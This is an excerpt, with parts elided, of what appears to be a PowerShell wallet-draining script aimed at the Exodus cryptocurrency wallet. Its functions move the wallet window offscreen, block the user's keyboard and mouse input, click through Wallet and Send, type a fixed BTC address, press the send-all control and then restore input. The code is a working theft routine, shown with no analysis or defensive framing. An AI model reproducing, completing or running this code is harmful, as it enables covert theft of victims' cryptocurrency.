...
function Move-WindowOffscreen {
    ...
    foreach($proc in $targets){
        if($proc.MainWindowHandle -ne 0){
            # Move offscreen but keep window active
...
function Bring-WindowOnscreen {
    ...
    foreach($proc in $targets){
        if($proc.MainWindowHandle -ne 0){
            # Restore to visible area (100,100)
...
function DoWalletSendFlow {
    ...
    $mainWin = RefreshExodusWindow
    Disable-UserInput   # 🛑 Block user input

    Write-Host "[INFO] Clicking Wallet..."
    $ok = ClickElementByName $mainWin "Wallet"
    if(-not $ok){ Write-Host "[ERR] Wallet not clickable"; Enable-UserInput; return }

    Start-Sleep -Seconds 1.0

    Write-Host "[INFO] Clicking Send..."
    $ok2 = ClickElementByName $mainWin "Send"
    if(-not $ok2){ Write-Host "[ERR] Send not clickable"; Enable-UserInput; return }

    # Smart BTC typing (UIA direct set or fallback onscreen focus)
    TypeBTC $mainWin $btcAddress
    Start-Sleep -Milliseconds 300

    ClickAllButton $mainWin

    Enable-UserInput   # ✅ Re-enable user input
}
